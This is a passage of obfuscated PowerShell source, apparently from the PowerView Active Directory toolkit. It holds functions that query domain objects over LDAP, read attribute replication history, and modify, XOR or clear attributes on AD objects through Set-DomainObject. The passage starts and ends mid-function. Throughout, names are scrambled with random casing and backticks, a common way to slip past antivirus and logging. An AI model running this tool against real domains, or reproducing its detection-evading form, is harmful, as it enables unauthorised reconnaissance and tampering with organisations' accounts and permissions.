    [OutputType('PowerView.ADObject')]
    [OutputType('PowerView.ADObject.Raw')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${T`RUE}, ValueFromPipelineByPropertyName = ${t`RuE})]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        ${iD`eN`Tity},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`oM`AiN},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${LDa`PFILt`eR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pr`OPE`RtiEs},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${sea`RCH`BasE},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${sE`RvEr},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${SEAR`c`HSc`Ope} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${ReSU`l`TPAG`esI`zE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SE`RvE`RtIm`eL`iMIt},

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        ${sE`CuR`IT`y`masKs},

        [Switch]
        ${t`OMBs`TONe},

        [Alias('ReturnOne')]
        [Switch]
        ${F`iNDoNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`R`edEnTial} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${R`Aw},

        [Switch]
        ${S`sL},

        [Switch]
        ${obfu`s`Cate}
    )

    DynamicParam {
        ${uAc`V`AlUenam`ES} = [Enum]::GetNames(${u`ACEN`UM})
        
        ${UA`cval`U`E`NameS} = ${u`Ac`VA`luENAMeS} | fOrEAc`h-`ObJE`Ct {${_}; "NOT_$_"}
        
        NeW-`DY`Nami`CpAR`Am`eTEr -Name uacfiL`T`ER -ValidateSet ${u`ACv`ALue`NAmEs} -Type ([array])
    }

    BEGIN {
        ${S`E`ArcheR`ARguMe`NTS} = @{}
        if (${P`SboUNdPA`RA`m`etERs}['Domain']) { ${SE`A`RcHer`Ar`GuMEnTS}['Domain'] = ${DoMa`iN} }
        if (${PS`BouN`dP`ARaME`T`ERS}['Properties']) { ${s`eArche`RA`RGumen`Ts}['Properties'] = ${pRop`ERTI`Es} }
        if (${pSB`OUNdP`ARam`eteRS}['SearchBase']) { ${SEa`RC`HerAR`gUMe`NTs}['SearchBase'] = ${seAr`Ch`Ba`SE} }
        if (${pSbOuNDP`ARaM`eTE`Rs}['Server']) { ${sea`RchE`RAR`gumEN`TS}['Server'] = ${sE`Rv`ER} }
        if (${P`SBoU`NDpaR`AmEt`e`RS}['SearchScope']) { ${Se`A`RC`HEraRGuMenTS}['SearchScope'] = ${SE`ArchsC`o`Pe} }
        if (${p`S`BOUN`DPAram`EtERs}['ResultPageSize']) { ${SeA`RChErAR`gu`me`Nts}['ResultPageSize'] = ${reSul`T`pagE`sizE} }
        if (${p`sb`ouN`dPARa`meTErs}['ServerTimeLimit']) { ${SeaRCH`ER`Ar`G`UMEn`TS}['ServerTimeLimit'] = ${s`ErV`ERTiMe`lim`it} }
        if (${P`SBOU`NdpAraMeT`ErS}['SecurityMasks']) { ${sE`A`RcheR`ARGu`mEnts}['SecurityMasks'] = ${seC`URIt`Y`M`ASkS} }
        if (${P`SbOU`N`dparaM`Et`ERs}['Tombstone']) { ${seArcHErArG`U`mEn`TS}['Tombstone'] = ${tom`BStO`NE} }
        if (${pS`BOUnD`PaRAm`E`TerS}['Credential']) { ${S`Ea`R`c`HeRarGuME`NTs}['Credential'] = ${cr`e`DenTIAL} }
        if (${p`sbo`UND`para`metE`Rs}['FindOne']) { ${SEaR`ChErA`Rgu`m`enTS}['FindOne'] = ${f`iNdONe} }
        if (${p`SBOUndpa`RA`METErS}['SSL']) { ${sEA`R`cheR`ARg`UMeNTS}['SSL'] = ${S`Sl} }
        if (${PSBo`UnD`pa`RaMeterS}['Obfuscate']) {${SEA`Rch`ERar`guM`E`NTs}['Obfuscate'] = ${oB`FuSC`AtE} }
    }

    PROCESS {
        
        if (${P`SbOuNd`P`AramEt`erS} -and (${Psb`o`UNDpaRAMet`e`Rs}.Count -ne 0)) {
            NE`w`-`dynAMICpA`RaM`ETEr -CreateVariables -BoundParameters ${Psb`OUnDpaR`AMe`T`e`RS}
        }
        ${ID`E`N`TitYf`ilTER} = ''
        ${fil`T`eR} = ''
        ${iD`E`NtiTy} | wHERE-`oB`jeCt {${_}} | f`oREaC`h-oBJe`cT {
            ${IDe`NTitYinsTa`N`Ce} = ${_}.Replace('(', '\28').Replace(')', '\29')
            if (${ID`ENtITY`iN`sT`ANCE} -match '^S-1-') {
                ${id`eNTItYfI`l`TER} += "(objectsid=$IdentityInstance)"
            }
            elseif (${I`DEN`T`itYI`NSTA`Nce} -match '^(CN|OU|DC)=') {
                ${i`De`NtI`Ty`FIltEr} += "(distinguishedname=$IdentityInstance)"
                if ((-not ${psB`oUnDpaRAmE`Te`RS}['Domain']) -and (-not ${PsB`OunDP`ArAm`etErs}['SearchBase'])) {
                    
                    
                    ${id`e`Nt`ItYDom`AIN} = ${I`dEn`TiTYIn`s`TanCE}.SubString(${iDEnTI`TYi`Nsta`NcE}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                    Wr`iT`E-Ve`RBOse "[Get-DomainObject] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                    ${SEArCh`E`RarGumeN`TS}['Domain'] = ${ideN`TitY`doM`AIn}
                    ${O`BjEctSe`Ar`cHER} = GE`T-Do`MAins`eARcHer @SearcherArguments
                    if (-not ${ObJ`eCtsEA`R`CHER}) {
                        wRite-wa`Rni`NG "[Get-DomainObject] Unable to retrieve domain searcher for '$IdentityDomain'"
                    }
                }
            }
            elseif (${IDEn`TiTYinsta`N`Ce} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                ${GUI`dbY`TeSTrINg} = (([Guid]${I`DeN`TI`TyiNst`ANCE}).ToByteArray() | FoRE`A`ch`-oBjeCT { '\' + ${_}.ToString('X2') }) -join ''
                wRITe-O`UT`pUT "$GuidByteString"
                ${idEN`Ti`T`yfILTeR} += "(objectguid=$GuidByteString)"
            }
            elseif (${iD`eNTi`T`YiNsTancE}.Contains('\')) {
                ${Co`Nv`erTE`dI`DENt`ITyIn`StAN`ce} = ${I`deN`T`ity`iNst`ANce}.Replace('\28', '(').Replace('\29', ')') | ConVER`T-ADn`A`me -OutputType cA`NONic`AL
                if (${cOnver`TEDID`eNTi`TYiN`sT`A`NCE}) {
                    ${ObjECTDO`m`A`In} = ${C`ONVertEd`i`deNTITyI`N`St`ANce}.SubString(0, ${CoNvERTEDi`De`NT`I`TyInstA`NcE}.IndexOf('/'))
                    ${ObJEct`NA`Me} = ${iDEnT`i`TyI`N`sTaNCE}.Split('\')[1]
                    ${IDenTit`YF`iLT`ER} += "(samAccountName=$ObjectName)"
                    ${s`eA`RchEr`ArGu`me`NtS}['Domain'] = ${OBje`C`TdomAIN}
                    wR`ItE-VErbO`se "[Get-DomainObject] Extracted domain '$ObjectDomain' from '$IdentityInstance'"
                    ${o`BjECt`sEarC`heR} = G`E`T-d`O`maiNSeaRC`Her @SearcherArguments
                }
            }
            elseif (${IDeN`TIT`YINstaN`Ce}.Contains('.')) {
                ${i`De`NTItYfI`lt`er} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
            }
            else {
                ${iDEN`Tity`FiLteR} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
            }
        }
        if (${ID`eNt`iTYfiL`TEr} -and (${i`D`EnTIty`FiL`Ter}.Trim() -ne '') ) {
            ${f`ilter} += "(|$IdentityFilter)"
        }
        if (${pSboU`NDP`A`RamET`eRs}['LDAPFilter']) {
            wRITE-v`eRb`o`SE "[Get-DomainObject] Using additional LDAP filter: $LDAPFilter"
            ${fI`LTeR} += "$LDAPFilter"
        }

        
        ${Ua`cFIL`TEr} | w`HEr`e-OBJe`CT {${_}} | fO`ReaCH`-ObJ`E`ct {
            if (${_} -match 'NOT_.*') {
                ${u`ACf`IeLD} = ${_}.Substring(4)
                ${UAc`Va`L`UE} = [Int](${ua`C`enUM}::${uac`FIe`ld})
                ${f`I`lTeR} += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
            }
            else {
                ${UacV`ALue} = [Int](${uAC`eN`Um}::${_})
                ${FI`lter} += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
            }
        }

        if (${f`ilT`Er} -and ${F`i`Lter} -ne '') {
            ${sEarC`HERArGU`M`EN`Ts}['LDAPFilter'] = "(&$Filter)"
        }
        w`RIte`-`VeRb`OSE "[Get-DomainObject] Get-DomainObject filter string: $($Filter)"
            
        ${rES`U`lTS} = iNVOKE`-ldA`pquERy @SearcherArguments
        ${re`s`ULTs} | WheRe-`Obj`e`cT {${_}} | FOrEA`Ch-Obj`E`CT {
            if (${p`SBoUnd`Pa`RamETers}['Raw']) {
                
                ${oB`jeCt} = ${_}
                ${OB`jEct}.PSObject.TypeNames.Insert(0, 'PowerView.ADObject.Raw')
            }
            else {
                if (g`et-`MEmbER -inputobject ${_} -name "Attributes" -Membertype propE`Rt`IES) {
                    ${pR`OP} = @{}
                    foreach (${A} in ${_}.Attributes.Keys | SO`R`T-OBJeCT) {
                        if ((${A} -eq 'objectsid') -or (${A} -eq 'sidhistory') -or (${A} -eq 'objectguid') -or (${a} -eq 'usercertificate')) {
                            ${Pr`OP}[${A}] = ${_}.Attributes[${A}]
                        }
                        else {
                            ${VA`L`UeS} = @()
                            foreach (${v} in ${_}.Attributes[${a}].GetValues([byte[]])) {
                                ${V`A`lUes} += [System.Text.Encoding]::UTF8.GetString(${V})
                            }
                            ${PR`OP}[${a}] = ${V`Al`UEs}
                        }
                    }
                }
                else {
                    ${Pr`Op} = ${_}.Properties
                }

                ${o`BJe`ct} = co`NverT`-l`d`A`PProPEr`Ty -Properties ${pR`Op}
                ${obJ`ECT}.PSObject.TypeNames.Insert(0, 'PowerView.ADObject')
            }
            ${o`B`jEcT}
        }
        if (${reS`Ul`Ts}) {
            try { ${rE`suL`TS}.dispose() }
            catch {
                wri`T`E-VERBo`SE "[Get-DomainObject] Error disposing of the Results object: $_"
            }
        }
    }
}


function g`Et-do`maINob`jeCt`AtTri`ButeH`ISTORy {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${T`RuE}, ValueFromPipelineByPropertyName = ${tR`Ue})]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        ${Ident`iTy},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Do`maiN},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${ldAp`FIL`TeR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pr`oPErTI`eS},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${s`earChB`ASE},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${Se`RVer},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${sE`AR`C`hSCoPE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${R`esULtpAG`e`Si`ZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`E`RVERTiMel`ImIT},

        [Switch]
        ${tOm`B`stONe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cred`ENTi`Al} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${r`Aw}
    )

    BEGIN {
        ${SE`ARcHER`AR`GUmEnTs} = @{
            'Properties'    =   'msds-replattributemetadata','distinguishedname'
            'Raw'           =   ${tR`UE}
        }
        if (${P`sB`OUnDPA`RAMeT`e`Rs}['Domain']) { ${sEArcHE`Rarg`U`m`EnTs}['Domain'] = ${dO`Ma`In} }
        if (${PsBoU`NDP`ArAm`et`e`Rs}['LDAPFilter']) { ${SEaRCHE`R`A`Rg`Um`ENTS}['LDAPFilter'] = ${L`DApFI`lt`eR} }
        if (${ps`BouNDpaRAmE`TE`Rs}['SearchBase']) { ${SEarCheraR`Gu`M`e`Nts}['SearchBase'] = ${s`EaRC`H`BaSE} }
        if (${p`sBoU`Nd`PA`R`AMETErs}['Server']) { ${Sea`RC`hErARGuME`Nts}['Server'] = ${ser`Ver} }
        if (${pSB`o`Und`ParaMetE`Rs}['SearchScope']) { ${SEARCH`E`Ra`RGUM`eN`Ts}['SearchScope'] = ${s`eaR`chs`COpe} }
        if (${pSBOunDp`ARA`Met`Ers}['ResultPageSize']) { ${SEa`R`C`hE`RArgu`MeNTs}['ResultPageSize'] = ${REsULt`P`AgEs`Ize} }
        if (${pS`B`OU`Nd`PAr`AMEtERs}['ServerTimeLimit']) { ${S`EaRChE`RARGum`e`NtS}['ServerTimeLimit'] = ${ServER`TiMel`i`m`It} }
        if (${p`SbO`UNDPa`RaMEt`ers}['Tombstone']) { ${SE`A`RC`h`ERArG`UmeNtS}['Tombstone'] = ${TOmbS`T`One} }
        if (${PSB`o`Undpa`RAMe`T`ERs}['FindOne']) { ${se`ARcH`ERa`Rg`UME`NTS}['FindOne'] = ${F`INdO`NE} }
        if (${p`sBOuNDpA`R`AM`ET`ERS}['Credential']) { ${searc`he`RaR`GuMEnts}['Credential'] = ${c`REd`e`NTIaL} }

        if (${p`SB`O`Undp`ArAMETE`RS}['Properties']) {
            ${pRO`PErt`yFIL`TEr} = ${PsBoun`D`PAraMET`erS}['Properties'] -Join '|'
        }
        else {
            ${PRoPer`TYfi`L`T`Er} = ''
        }
    }

    PROCESS {
        if (${Ps`BOUNDP`AraMete`RS}['Identity']) { ${SEaRC`He`RaR`GuMEnTs}['Identity'] = ${id`ENT`ITY} }

        g`et-domAinOb`JE`Ct @SearcherArguments | fOR`EA`ch-OB`jE`Ct {
            ${o`B`JECtdN} = ${_}.Properties['distinguishedname'][0]
            ForEach(${xmlnO`de} in ${_}.Properties['msds-replattributemetadata']) {
                ${tE`Mp`O`BjEct} = [xml]${X`m`lNOde} | SeL`EcT-ObJ`Ect -ExpandProperty 'DS_REPL_ATTR_META_DATA' -ErrorAction silE`NtlYCON`Tin`Ue
                if (${tE`MpO`Bj`EcT}) {
                    if (${Temp`OBjE`ct}.pszAttributeName -Match ${pR`opERTy`Filt`er}) {
                        ${oU`T`pUt} = NEW-ob`J`Ect PSO`BJ`ECt
                        ${oU`T`PUT} | aDD`-M`EMbeR NoTePro`PeR`Ty 'ObjectDN' ${ob`j`EctdN}
                        ${o`UtPut} | aD`d-MEM`BER N`otepRopE`RTY 'AttributeName' ${TEm`Po`Bje`Ct}.pszAttributeName
                        ${Ou`Tput} | Ad`D`-M`eMbeR No`TE`PROPe`Rty 'LastOriginatingChange' ${te`mPo`BjeCT}.ftimeLastOriginatingChange
                        ${out`pUT} | A`Dd-m`E`mBeR NoTE`pRope`RtY 'Version' ${T`EM`P`ObJect}.dwVersion
                        ${ou`T`puT} | ADd`-Me`mBEr not`E`PR`oPerTY 'LastOriginatingDsaDN' ${T`emp`objEct}.pszLastOriginatingDsaDN
                        ${o`Ut`puT}.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectAttributeHistory')
                        ${OU`T`PUt}
                    }
                }
                else {
                    wr`i`Te-VErbOsE "[Get-DomainObjectAttributeHistory] Error retrieving 'msds-replattributemetadata' for '$ObjectDN'"
                }
            }
        }
    }
}


function Get-`Domai`NoBJ`eC`TLin`KEd`AttrI`BuTehiStORy {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectLinkedAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${t`RUE}, ValueFromPipelineByPropertyName = ${T`RUe})]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        ${i`dEN`TiTy},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Do`M`AiN},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${Lda`PfI`LT`Er},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pR`oPE`RtIEs},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${Se`Archba`sE},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${Se`RvER},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${S`EArc`HsCO`pe} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${RES`U`LTP`AGESI`ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`ErvErTIm`E`l`ImiT},

        [Switch]
        ${TomB`sTo`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`EDE`NTI`AL} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${R`AW}
    )

    BEGIN {
        ${S`EA`RC`HERA`Rgu`meNTs} = @{
            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
            'Raw'           =   ${TR`UE}
        }
        if (${p`SbOUn`dpar`AMEteRs}['Domain']) { ${sea`R`cHeraRG`UmeNtS}['Domain'] = ${Do`MAIn} }
        if (${Psbo`Un`D`pARA`me`Ters}['LDAPFilter']) { ${Sea`Rch`e`RarGume`NTS}['LDAPFilter'] = ${LdAPf`IL`TER} }
        if (${p`S`BouNd`Pa`Ra`MeteRS}['SearchBase']) { ${sE`ARChEr`ARg`U`m`entS}['SearchBase'] = ${s`eArcHb`Ase} }
        if (${ps`Bo`UND`p`AramEtERs}['Server']) { ${S`eAR`cH`eraRGU`MeNts}['Server'] = ${s`ErvEr} }
        if (${p`SBouNdP`Ar`A`mEt`erS}['SearchScope']) { ${s`EA`RC`H`ErarGuMENTS}['SearchScope'] = ${SE`Ar`CHs`coPe} }
        if (${PsBO`UNdPaRA`m`eT`E`RS}['ResultPageSize']) { ${S`earCh`ERA`RgumenTs}['ResultPageSize'] = ${R`ES`ULTPaGe`sizE} }
        if (${P`s`B`oU`NdPa`RameTERS}['ServerTimeLimit']) { ${Se`A`RCheraR`Gu`me`NtS}['ServerTimeLimit'] = ${SE`RVe`RTI`MElimiT} }
        if (${PS`BOU`Nd`pARaMetERS}['Tombstone']) { ${s`Earc`HerA`RgUMen`Ts}['Tombstone'] = ${ToMB`sT`oNe} }
        if (${ps`Bo`UnDpaRAm`Et`eRs}['Credential']) { ${S`earcheRAR`gU`mEn`Ts}['Credential'] = ${CR`eDe`N`TiaL} }

        if (${PS`Bou`NDPA`R`AmEt`ERs}['Properties']) {
            ${P`RopErTy`FIltER} = ${PsbO`U`NdparaMET`ErS}['Properties'] -Join '|'
        }
        else {
            ${PrOPertY`F`ilteR} = ''
        }
    }

    PROCESS {
        if (${PSBO`UndP`Ar`Am`ETE`RS}['Identity']) { ${SEA`Rch`eRArg`UmEnTs}['Identity'] = ${I`dENTi`Ty} }

        gEt-d`oMAiNOb`J`ECT @SearcherArguments | fo`ReAC`H-OBJ`ect {
            ${ObJe`CTdN} = ${_}.Properties['distinguishedname'][0]
            ForEach(${Xm`lnOde} in ${_}.Properties['msds-replvaluemetadata']) {
                ${t`E`MPoB`jecT} = [xml]${XmLn`o`De} | SEl`EC`T-`oBJE`Ct -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction sIlENT`l`yC`ONT`iNUe
                if (${teMP`ob`jECT}) {
                    if (${t`eM`p`obJEcT}.pszAttributeName -Match ${PROpERt`yFILT`er}) {
                        ${OUT`P`UT} = N`Ew-Obj`ect PSoBj`ECT
                        ${Ou`Tp`UT} | a`dd-M`eMbEr NO`T`ep`RoPERTy 'ObjectDN' ${objE`CT`dN}
                        ${Ou`T`PUT} | ad`d-mem`BeR notEp`Ro`peRty 'AttributeName' ${tEmPob`J`E`CT}.pszAttributeName
                        ${O`UTpuT} | a`dd-M`embeR No`TepROP`e`RTY 'AttributeValue' ${Tem`P`o`BjEct}.pszObjectDn
                        ${o`UTp`UT} | AD`d-MeM`BEr No`TePRO`PerTY 'TimeCreated' ${Te`MPOb`JE`ct}.ftimeCreated
                        ${Ou`Tput} | AdD-`mE`mbeR nOTEProPe`R`Ty 'TimeDeleted' ${TeM`P`o`BJecT}.ftimeDeleted
                        ${OUtp`Ut} | aD`d-MEM`BeR No`TE`PR`OpErTy 'LastOriginatingChange' ${Te`mP`Ob`JeCT}.ftimeLastOriginatingChange
                        ${OU`Tput} | a`dD`-mEMB`Er nOtEp`R`OPer`Ty 'Version' ${TEmpo`B`Ject}.dwVersion
                        ${Ou`Tp`Ut} | AD`D`-m`EmbEr NoT`E`ProperTy 'LastOriginatingDsaDN' ${T`E`MpobJE`Ct}.pszLastOriginatingDsaDN
                        ${O`U`TPut}.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectLinkedAttributeHistory')
                        ${oUT`PuT}
                    }
                }
                else {
                    WRItE`-`VErbo`se "[Get-DomainObjectLinkedAttributeHistory] Error retrieving 'msds-replvaluemetadata' for '$ObjectDN'"
                }
            }
        }
    }
}


function Set`-d`O`maINoBJECT {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = ${T`RUe}, ValueFromPipeline = ${T`Rue}, ValueFromPipelineByPropertyName = ${T`RuE})]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        ${iDe`NTI`Ty},

        [ValidateNotNullOrEmpty()]
        [Alias('Replace')]
        [Hashtable]
        ${s`Et},

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${X`Or},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Cle`AR},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Do`maiN},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${lDa`PFil`TER},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${S`eaRchB`ASE},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${s`eRV`eR},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${Se`A`RCHscOPE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${Resul`T`pAGEsI`ZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SERve`RT`iMElI`miT},

        [Switch]
        ${t`O`mBSTone},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`RE`De`NTiaL} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${Sea`RC`h`ER`ArgumENTs} = @{'Raw' = ${T`RUe}}
        if (${PSBO`U`N`DpAr`AmEtErs}['Domain']) { ${s`eAr`cHe`RARg`Um`eNTS}['Domain'] = ${Do`MA`iN} }
        if (${p`SBo`UnDPaRaMet`ErS}['LDAPFilter']) { ${s`Ea`RCHERArgU`mE`N`Ts}['LDAPFilter'] = ${LD`A`PFi`LTeR} }
        if (${p`s`BOU`NDpaRaMEt`ErS}['SearchBase']) { ${SeARcheRa`RGu`m`enTS}['SearchBase'] = ${sE`ARC`HB`ASe} }
        if (${PSbOU`NDPAR`A`met`E`RS}['Server']) { ${se`Arc`he`Rar`gu`mENtS}['Server'] = ${sE`RveR} }
        if (${PsbO`U`N`D`pa`RAMeTErs}['SearchScope']) { ${s`EA`RChERA`RguMe`NTS}['SearchScope'] = ${s`Ea`RcHS`COPe} }
        if (${pSBOuNdPaRA`me`T`ErS}['ResultPageSize']) { ${seArC`HeRaRGumE`N`Ts}['ResultPageSize'] = ${RESU`L`TPA`GeSiZe} }
        if (${P`sbou`N`Dpa`RAMETerS}['ServerTimeLimit']) { ${sEarCHe`Ra`Rg`UmENtS}['ServerTimeLimit'] = ${Se`R`V`ER`T`iMeLIMit} }
        if (${p`sBoU`NDpA`RameT`ers}['Tombstone']) { ${sE`A`RCh`Er`ARgUM`enTS}['Tombstone'] = ${T`o`MBstoNE} }
        if (${Psb`OUnDpaR`AME`Te`Rs}['Credential']) { ${s`eARch`e`RaRguMENTs}['Credential'] = ${crEd`ENTI`Al} }
    }

    PROCESS {
        if (${P`sBO`UnDpArA`MEtE`Rs}['Identity']) { ${sEaR`c`H`ErA`RGuMentS}['Identity'] = ${i`d`eNTITy} }

        
        ${r`AwoBJE`ct} = Ge`T-dOm`Aino`B`jecT @SearcherArguments

        ForEach (${oBJE`cT} in ${r`AWo`B`JeCT}) {

            ${En`T`RY} = ${RA`w`o`BjEct}.GetDirectoryEntry()

            if(${PSbOUnD`P`ARAMe`T`erS}['Set']) {
                try {
                    ${P`sbOU`NDp`ArameTeRS}['Set'].GetEnumerator() | fO`R`eAC`H-ObjECT {
                        W`RI`Te`-veRB`osE "[Set-DomainObject] Setting '$($_.Name)' to '$($_.Value)' for object '$($RawObject.Properties.samaccountname)'"
                        ${e`NT`Ry}.put(${_}.Name, ${_}.Value)
                    }
                    ${eNT`Ry}.commitchanges()
                }
                catch {
                    w`RiTE-wa`RnINg "[Set-DomainObject] Error setting/replacing properties for object '$($RawObject.Properties.samaccountname)' : $_"
                }
            }
            if(${Ps`BoUnD`paRAM`ET`ErS}['XOR']) {
                try {
                    ${P`sbOUnDPARa`m`EtERs}['XOR'].GetEnumerator() | FoReACh`-o`BJEcT {
                        ${p`RoPe`RTynamE} = ${_}.Name
                        ${pRO`PE`RtYx`OrvaL`UE} = ${_}.Value
                        w`Rit`e-`VErbOSe "[Set-DomainObject] XORing '$PropertyName' with '$PropertyXorValue' for object '$($RawObject.Properties.samaccountname)'"
                        ${tYpen`A`me} = ${EN`T`Ry}.${pR`OPer`Tyn`AME}[0].GetType().name

                        
                        ${prO`pE`RT`Y`VALue} = $(${ENT`RY}.${pRO`p`eR`TYnAME}) -bxor ${Prop`eRT`y`XOrVA`Lue}
                        ${E`N`TRY}.${pROper`Ty`NaME} = ${p`RO`P`e`RTYvalUe} -as ${Typ`e`NA`mE}
                    }
                    ${En`T`Ry}.commitchanges()
                }
                catch {
                    W`R`I`TE-`warnINg "[Set-DomainObject] Error XOR'ing properties for object '$($RawObject.Properties.samaccountname)' : $_"
                }
            }
            if(${P`sBoUn`dpar`AmEtERs}['Clear']) {
                try {
                    ${psboUn`D`pa`RAm`EterS}['Clear'] | FOr`eaCh`-O`BJEcT {
                        ${Pr`Oper`TYnAme} = ${_}
                        Wri`T`e-V`ErBoSE "[Set-DomainObject] Clearing '$PropertyName' for object '$($RawObject.Properties.samaccountname)'"
                        ${ent`Ry}.${PROpe`R`TyNa`mE}.clear()
                    }
                    ${En`TRY}.commitchanges()
                }
                catch {
                    W`RIt`E`-`WaRNINg "[Set-DomainObject] Error clearing properties for object '$($RawObject.Properties.samaccountname)' : $_"
                }
            }
        }
    }
}


function con`Ve`RTFro`m-LdaP`LO`gOnHouRs {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonHours')]
    [CmdletBinding()]
    Param (
        [Parameter( ValueFromPipeline = ${t`RUe}, ValueFromPipelineByPropertyName = ${t`RUe})]
        [ValidateNotNullOrEmpty()]
        [byte[]]
        ${LO`goN`HOU`RsaR`RAY}
    )

    Begin {
        if(${lO`GoNhouRsAr`RAy}.Count -ne 21) {
            throw "LogonHoursArray is the incorrect length"
        }

        function COnVerT`TO`-`L`OgONhOU`RSar`RAY {
            Param (
                [int[]]
                ${Hou`Rs`ARr}
            )

            ${LO`goNh`ours} = New-`oB`JEct B`O`Ol[] 24
            for(${I}=0; ${I} -lt 3; ${I}++) {
                ${B`yTE} = ${hO`U`RSARr}[${i}]
                ${o`F`FSeT} = ${I} * 8
                ${S`TR} = [Convert]::ToString(${B`YtE},2).PadLeft(8,'0')

                ${LO`Go`NhOUrs}[${oFf`S`Et}+0] = [bool] [convert]::ToInt32([string]${S`Tr}[7])
                ${lo`gonHou`Rs}[${off`s`ET}+1] = [bool] [convert]::ToInt32([string]${s`TR}[6])
                ${log`onHo`Urs}[${o`FfsEt}+2] = [bool] [convert]::ToInt32([string]${S`TR}[5])
                ${lO`gONHO`URs}[${OF`FSet}+3] = [bool] [convert]::ToInt32([string]${s`TR}[4])
                ${LogO`N`Ho`URS}[${o`FfseT}+4] = [bool] [convert]::ToInt32([string]${S`TR}[3])
                ${L`Og`onHours}[${OF`F`SeT}+5] = [bool] [convert]::ToInt32([string]${S`Tr}[2])
                ${lOG`O`NhOUrS}[${Of`FSET}+6] = [bool] [convert]::ToInt32([string]${S`Tr}[1])
                ${LOG`ON`hOurS}[${OfF`S`Et}+7] = [bool] [convert]::ToInt32([string]${S`Tr}[0])
            }

            ${LOg`oNH`ouRS}
        }
    }

    Process {
        ${O`UTp`UT} = @{
            Sunday = C`onvER`Tt`o-`loGonHouRsAR`RAY -HoursArr ${log`oN`hours`ArRAy}[0..2]
            Monday = ConVe`Rt`TO-L`O`GONh`oURSarR`Ay -HoursArr ${logoNH`oU`R`S`ArRay}[3..5]
